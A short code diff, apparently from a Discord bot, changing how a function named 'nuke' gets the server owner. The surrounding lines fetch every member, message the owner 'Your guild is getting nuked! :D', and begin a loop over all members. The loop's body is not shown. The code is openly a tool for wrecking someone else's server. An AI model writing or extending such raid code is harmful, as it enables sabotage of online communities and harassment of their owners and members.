@@ -8,7 +8,7 @@ async function nuke(guild) {
 
   await guild.fetchMembers();
 
-  const owner = await guild.fetchMember(guild.ownerID);
+  const owner = guild.owner;
   await owner.sendMessage('Hey there! Your guild is getting nuked! :D');
 
   await Promise.all(guild.members.map(async m => {
